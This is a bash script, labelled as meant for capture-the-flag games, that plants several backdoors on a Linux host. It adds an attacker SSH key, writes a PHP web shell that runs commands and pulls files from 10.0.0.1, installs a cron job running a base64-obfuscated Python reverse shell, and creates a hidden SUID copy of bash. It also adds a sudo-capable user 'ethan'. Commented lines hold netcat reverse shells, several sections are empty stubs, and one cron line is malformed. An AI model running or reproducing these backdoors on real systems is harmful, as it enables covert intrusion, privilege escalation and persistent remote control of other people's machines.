#!/bin/bash

#Script to add multiple backdoors to a linux system
#Intended for CTF's
#
#

#To Do:
#
#
#
#

LHOST='10.0.0.1'

#Update PATH variable for scripts
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/root/go/bin

#add backdoor to .bashrc
#echo "rm -f /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/sh -i 2>&1|nc ${LHOST} 8001 >/tmp/y" >> ~/.bashrc

#add ssh public key
echo "Adding SSH public key"
#ssh-keygen -f key
mkdir -p ~/.ssh;chmod 700 ~/.ssh;echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMk4pzZCCzqpsnaHX+y6qBLv5DEJWPsBQgDR1u14ImJAOVjp2x/RSxFfDxC9FUUXnr1ubsnVqflbt/yTVJwW6qyqD2sHNFiCoqS6WWAX9z3TRymUlF0fwYw59ClUfkTG6JWH4Fmg2rTcy9ecfL4/YsaUtaK/Z0EPBjFUX8eGJDIceX3coa8xBHokd+QBQjQjZJULI4lQXPYF2WXaE4GEcJkFbbbafkZzzu2otMdEjkFVuXbOpEO6GqWPK1lITYFMJDrnoItQntPRClTWXQlUgIgjSk/GcQEZSuse5IFTzgOutfq5du6KFBQG899vn/7YBnK/OLi0EykbIWMCV2DkxwrlHxVzAVPQqfukpL5DMVkFBPIH6ag2oSJRUS+AnsxRCrP2f7fXFJ1ooKM2PL+wWouw39qvouA4bAdEyZY5uctYPX9gO1U6zxwEeve8IWzien1m8vno2KL5eFmxL8qDLUjXowuShRSRzTi8tDqfHTX/dFCyL+fhQcUdJKrHSF4WE= root@kali' >> ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys

#nc for loop
#while(true); do rm -p /tmp/z;mkfifo /tmp/z;cat /tmp/z|/bin/sh -i 2>&1|nc 10.0.0.1 443 >/tmp/z; sleep 10; done

#Create a webshell
DIR="/var/www/html/"
if [ -d "${DIR}" ]; then
  # Take action if $DIR exists. #
  echo "Installing webshell in ${DIR}..."
  cat 1>/dev/null << 'EOD' >> ${DIR}/backdoor.php
  <?php
   if (isset($_REQUEST['fupload'])) {
    file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.0.0.1:80/" . $_REQUEST['fupload']));
   };
   if (isset($_REQUEST['fexec'])) {
    echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
   };
  ?>
EOD
  
fi

# SSH motd backdoor
echo '\n[+] Creating SSH motd backdoor'

#.bashrc - aliases
echo '\n[+] Creating .bashrc - aliases backdoor'

#rc.local
echo '\n[+] Creating rc.local backdoor'

#cronjob
#https://crontab-generator.org/
echo '\n[+] Creating cronjob backdoor'
#* * * * * python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
#echo 'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMC4yMyIsNDQzKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiYmFzaCIpJw==' | base64 -d | sh
echo '* * * * * "cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMC4yMyIsNDQzKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiYmFzaCIpJw==" | base64 -d | bash' | crontab -
 "cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMC4yMyIsNDQzKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiYmFzaCIpJw==" | crontab -

#backdoor service
echo '\n[+] Creating service backdoor'

#SUID priv esc backdoor
echo '\n[+] Creating SUID priv esc backdoor'
cp /bin/bash /var/tmp/.mysqldeamon
chmod u+s /var/tmp/.mysqldeamon
#kali: vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

#pam_unix.so backdoor
echo '\n[+] Creating pam_unix.so backdoor'

#apache mod_rootme
echo '\n[+] Creating apache mod_rootme backdoor'
#https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c

#custom python backdoor reverse shell
echo '\n[-] Creating custom python backdoor reverse shell backdoor'

#add a user with full sudo privileges
#create password ```perl -e 'print crypt("password", "salt"),"\n"'``` - OUTPUT: sa3tHJ3/KuYvI
echo '\n[+] Adding user ethan with SSH and Sudo ALL'
useradd -m -p sa3tHJ3/KuYvI ethan -s /bin/bash #password: password
echo 'ethan ALL=(ALL) ALL' >> /etc/sudoers
mkdir -p /home/ethan/.ssh;chmod 700 ~/.ssh;echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMk4pzZCCzqpsnaHX+y6qBLv5DEJWPsBQgDR1u14ImJAOVjp2x/RSxFfDxC9FUUXnr1ubsnVqflbt/yTVJwW6qyqD2sHNFiCoqS6WWAX9z3TRymUlF0fwYw59ClUfkTG6JWH4Fmg2rTcy9ecfL4/YsaUtaK/Z0EPBjFUX8eGJDIceX3coa8xBHokd+QBQjQjZJULI4lQXPYF2WXaE4GEcJkFbbbafkZzzu2otMdEjkFVuXbOpEO6GqWPK1lITYFMJDrnoItQntPRClTWXQlUgIgjSk/GcQEZSuse5IFTzgOutfq5du6KFBQG899vn/7YBnK/OLi0EykbIWMCV2DkxwrlHxVzAVPQqfukpL5DMVkFBPIH6ag2oSJRUS+AnsxRCrP2f7fXFJ1ooKM2PL+wWouw39qvouA4bAdEyZY5uctYPX9gO1U6zxwEeve8IWzien1m8vno2KL5eFmxL8qDLUjXowuShRSRzTi8tDqfHTX/dFCyL+fhQcUdJKrHSF4WE= root@kali' >> /home/ethan/.ssh/authorized_keys;chmod 600 /home/ethan/.ssh/authorized_keys;chown -R ethan: /home/ethan/.ssh


#Files to have in a resources folder:
#32-bit, 64-bit binaries of: chattr, lsattr, set, curl, wget, cd, base64
#
#
#
#
#
#
